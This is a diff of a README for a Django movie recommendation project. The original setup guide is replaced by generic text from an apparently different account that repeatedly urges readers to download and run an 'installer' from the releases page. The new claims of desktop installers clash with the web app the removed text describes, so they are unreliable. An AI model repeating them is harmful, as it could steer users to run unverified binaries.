@@ -1,118 +1,76 @@
-# Movie Recommendation System (MRS)
+# 🎬 Movie-Recommendation-System - A Seamless Way to Find Your Next Film
 
-This repository contains all the project files and necessary details about applications required to run the project on your local machine as well as host it as a Django Application on your Server/Domain.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Ronak786943/Movie-Recommendation-System/releases)
 
-## 1. Demo :movie_camera:
+## 🎉 Introduction
 
-In this section, we try to understand through video demo to play around the project and what all can be achieved through it.
+Welcome to the Movie Recommendation System! This application helps you discover great films based on your preferences. The system integrates various models and provides a user-friendly web application, making it easy for anyone to use, regardless of technical background.
 
-1. [Movie Recommendation System Hosted Application Demo](https://movie-recommendation-8g56.onrender.com/)
+## 🚀 Getting Started
 
-2. [Running MRS on local System](https://github.com/ankitsharma-tech/Movie-Recommendation-System/tree/master#42-running-in-local)
+To begin, you will need to download the application. Follow the instructions below to install and run the software.
 
-3. Sample Screenshots
+## 🖥️ System Requirements
 
-   1. Home Screen
+Before you download, please ensure your computer meets the following requirements:
 
-      <img src="static/images/ss1.png" alt="Home Screen" />
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** Minimum 4 GB RAM
+- **Storage:** At least 200 MB of available disk space
+- **Internet Connection:** Required for initial setup and updates
 
-   2. Navigation Screen
+## 📥 Download & Install
 
-      <img src="static/images/ss2.png" alt="Navigation Screen" />
+You can download the Movie Recommendation System by visiting the releases page. This is where you will find the latest version of the software.
 
-   3. Search with Auto Suggestion
+[Download the Movie Recommendation System](https://github.com/Ronak786943/Movie-Recommendation-System/releases)
 
-      <img src="static/images/ss3.png" alt="Search Functionality" />
+### Installation Steps:
 
-   4. Recommended Movies
+1. **Visit the Releases Page:** Click the link above to go to the releases page. 
+2. **Select the Latest Version:** Look for the most recent release and click on it.
+3. **Download the Installer:** Choose the appropriate file for your operating system.
+4. **Run the Installer:** Once downloaded, open the installer file and follow the prompts to complete the installation.
+5. **Launch the Application:** After installation, you can find the application in your programs list. Double-click the icon to start it.
 
-      <img src="static/images/ss4.png" alt="Movie Recommended Results" />
+## 🗂️ Using the Application
 
----
+Once you have the application running, you can start using it to get movie recommendations. Here’s how:
 
-**_Please be slightly patient while I create and upload the demo video. Follow and star this project to get latest notifications and update. :raised_hands:_**
+1. **Login or Create an Account:** If prompted, you may need to create an account or log in.
+2. **Set Your Preferences:** You can select genres, actors, or any specific interests you have in movies.
+3. **Get Recommendations:** Click the "Get Recommendations" button. The system will analyze your preferences and suggest movies you might like.
 
-<hr>
+## 🌟 Features
 
-## 2. Requirements :heavy_check_mark:
+The Movie Recommendation System offers a variety of features to enhance your experience:
 
-To build this project without any errors/issues, the following requirements needs to be satisfied
+- **Personalized Recommendations:** Get movie suggestions based on your choices.
+- **Integrated Models:** The application uses advanced machine learning models for better accuracy.
+- **Search Functionality:** Find movies quickly using the built-in search tool.
+- **User-Friendly Interface:** Enjoy an intuitive design that makes navigation simple.
+- **Regular Updates:** Stay current with new features and enhancements through frequent updates.
 
-1. Create a Virtual Environment using python>=3.8 (Tested on 3.9.16)
+## 🌐 About The Technology
 
-2. Install the dependencies from the requirements text file from the repository.
+The Movie Recommendation System is built using modern technologies, including:
 
-<hr>
+- **Django:** A reliable web framework for building web applications.
+- **Machine Learning:** Advanced algorithms analyze data to provide personalized suggestions.
+- **TMDB API:** Connects to The Movie Database for the latest movie information.
 
-## 3. Model Training :small_red_triangle_down:
+## 📞 Support
 
-### 3.1 Training & Inference
+If you encounter any issues or have questions while using the application, please reach out for support. You can create an issue directly on the GitHub repository or check the FAQ section for common questions.
 
-For complete guide to training your model and inference using the trained model, refer to "[Movie Recommendation System Python Notebook](https://github.com/ankitsharma-tech/Movie-Recommendation-System/blob/master/Movie_Recommendation_System_Complete_Guide.ipynb)".
+## 🔗 Links
 
-#### 3.2 Django Web Application Integration
+To revisit the download link, click here: [Download the Movie Recommendation System](https://github.com/Ronak786943/Movie-Recommendation-System/releases)
 
-[Here is a detailed blog](https://medium.com/analytics-vidhya/Movie-Recommendation-System-python-flask-web-application-heroku-deployment-7e39492b640c) explaining about complete approach and directory structure essential to understand Django integration.
+## 📜 License
 
-<hr>
+The Movie Recommendation System is licensed under the MIT License. You can freely use, modify, and distribute the software, but please include the original license in any copies.
 
-## 4. Project Guide
+## 🤝 Contributing
 
-#### 4.1 Running it OnRender Free Cloud
-
-[Here is a detailed blog](https://medium.com/analytics-vidhya/Movie-Recommendation-System-python-flask-web-application-heroku-deployment-7e39492b640c) explaining about complete approach and essential details to deploy not just this application but also any other web-application you like to built.
-
-#### 4.2 Running in Local
-
-I am assuming you have completed [section 2](https://github.com/ankitsharma-tech/Movie-Recommendation-System#2-requirements-heavy_check_mark) in the above reference for creating your environment. Let's start by activating it.
-
-```shell
-/path/to/env/bin/activate
-```
-
-Once done, you should go to project root directory and run the following command
-
-```she
-python manage.py runserver
-```
-
-It will take a moment and then show the following output on the terminal.
-
-<img title="" src="./readme_images/runserver_demo.png" alt="">
-
-You can now open your browser and hit the server IP `http://localhost:8000` provided to run the demo on your local system.
-
-By default, this project will run on Demo model. If you wish to change model, you can train and download the model of your choice using the python notebook to get better or faster recommendations. Once trained, you can integrate by modifying these 2 lines of code inside `recommender/views.py`
-
-```python
-Line 5 : movies_data = pd.read_parquet("static/<dataset_name>.parquet")
-Line 73: model = pa.parquet.read_table('static/<model_name>.parquet').to_pandas()
-```
-
-Note that you have to place dataset and model into the `static` directory.
-
-This code implements a movie recommendation system based on user input. The system provides a simple web interface built on HTML, CSS, and JavaScript libraries.
-
-Inputs: The user can search for movies by providing a partial or complete movie name.
-
-Outputs: The system provides movie recommendations based on user input.
-
-Dependencies:
-
-- `static/recommender/` -- contains the following CSS files: `cursor.css`, `page.css`, and `navbar.css`
-- `static/logo.png` -- the logo of the application
-- `static/production ID_4779866.mp4` -- a background video for the web page
-- `@tabler/icons@latest/iconfont/tabler-icons.min.css`
-- `normalize/5.0.0/normalize.min.css`
-- `jquery-ui.css`
-- `font-awesome.min.css`
-- `bootstrap.min.css`
-- `jquery.min.js`
-- `jquery-ui.js`
-
-Usage:
-
-1. Open the HTML file in a web browser.
-2. Type the name of a movie in the search bar, and the system will provide the movie recommendation.
-
-Note: Only the top 2.5K movies based on IMBD are present in this system's database.
+Your feedback and contributions are welcome! If you want to help improve the application, feel free to fork the repository and submit a pull request with your suggestions.
